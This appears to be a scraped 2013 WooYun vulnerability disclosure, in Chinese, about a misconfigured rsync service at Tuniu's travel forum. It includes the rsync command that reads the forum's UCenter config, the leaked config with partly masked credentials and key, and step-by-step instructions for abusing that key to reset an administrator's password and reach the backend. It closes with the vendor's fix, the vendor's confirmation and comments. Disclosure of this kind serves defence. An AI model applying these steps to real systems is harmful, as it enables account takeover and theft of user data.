{"id": 9229, "wybug_id": "wooyun-2013-034737", "wybug_title": "途牛网某服务配置失误 导致论坛敏感文件泄露(致使百万用户信息告急)", "wybug_corp": "途牛旅游网", "wybug_author": "猪猪侠", "wybug_date": "2013-08-19 16:08", "wybug_open_date": "2013-10-03 16:09", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "内部敏感信息泄漏", "源码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-03：\t细节向公众公开  简要描述： 一个小小的运维缺陷，直接造成论坛最敏感的配置文件泄露，间接威胁到用户的隐私安全。 详细说明：  #1 途牛旅游网 某服务器RSYNCD服务端配置失误，不需要认证即可读取任意文件\nrsync 58.68.255.36::mnt_bbs/config/config_ucenter.php /tmp/config_ucenter.php\n#2 直接读取到途牛旅游网论坛的UCENTER配置文件\n<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', '10.10.0.**:3306');define('UC_DBUSER', 'RW_***');define('UC_DBPW', 'BBS@******#');define('UC_DBNAME', 'bbs');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`bbs`.cdb_ucenter_');define('UC_DBCONNECT', 0);define('UC_CHARSET', 'utf-8');define('UC_KEY', \"Uct3K2m7g06fW8Ifk080p9Z************keq8NdN1l73abeY8N6g4W4e64e\");define('UC_API', 'http://bbs.tuniu.com/uc_server');define('UC_APPID', '1');define('UC_IP', '127.0.0.1');//define('UC_PPP', 20);\n#3 通过获取到的UC_KEY，即可重置论坛任意用户的密码，并清除安全提问~! 本地环境安装一个标准的Discuz X2论坛，然后选择站长->UCenter设置http://127.0.0.1/admin.php?frames=yes&action=setting&operation=uc填入获取到的信息：\n\n记得：一定要选择接口方式，且 是否允许其他应用的会员在站点激活、是否允许直接激活 两项配置开启；#4 设置完毕后，点工具->更新缓存 更新一下系统缓存#5 来到用户管理界面，找到途牛旅游网的某个管理员信息http://bbs.tuniu.com/space-uid-35064-profile.html\n\n#6 回到自己的本地论坛，添加一个管理员，用户名一定要和实际环境的一致\n\n~! 系统提示用户已经存在，是否在本地激活，选择 是\n\n~! 这样管理员pandas的信息就通过UCenter的UC_KEY同步到了本地用户 pandas(UID 35064) 添加成功#7 查看pandas的信息，并修改他的密码，清除安全提问\n\n#8 这样就能使用修改后的密码pandasISpandn，登录途牛旅游网论坛的后台了\n\n   漏洞证明：  # 间接得到WebShell，接触到用户数据\n\n\n\n   修复方案：  #1 rsyncd 加入认证机制，且服务不对外网开放。#2 运维缺陷，安全意识普及。   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-08-19 16:14 厂商回复： 已确认，感谢@猪猪侠 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-19 16:10 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-08-19 16:11 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  @猪猪侠 我也想要超级棒棒糖貌似吃了超级棒棒糖就可以变身了    \n     2013-08-19 16:11 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  又来了~~~    \n     2013-08-19 16:23 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  看到\"告急\"两字，我就觉得特别NB.    \n     2013-08-19 16:28 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 途牛网某服务配置失误 导致论坛敏感文件泄露(致使百万用户信息告急) \t    \n     2013-08-19 17:05 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  看到\"告急\"两字，我就觉得特别NB.·    \n     2013-08-19 18:19 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  又是运维缺陷。。    \n     2013-10-03 16:26 |    \t\twoody \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 菜鸟一枚)\t\t \n  看到\"告急\"两字，我就觉得特别NB.·    \n     2013-11-25 16:22 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  猪哥，这是你发现的吗？那个备份文件自动生成的？    \n     2013-12-05 19:08 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  涨姿势了    \n     2013-12-12 13:14 |    \t\t哦哦 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 好123，最好的导航，没有之一)\t\t \n  看到\"告急\"两字，我就觉得特别NB.·    \n     2013-12-20 00:37 |    \t\tkissy \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 本人真心热爱，渗透测试、软件逆向等技术，...)\t\t \n  文章没有具体说如何 getshell 的啊 求大牛指教    \n     2015-03-29 12:43 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  我扫，我扫，我扫扫扫    \n     2015-06-13 23:49 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  其实我想知道shell是怎么拿的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}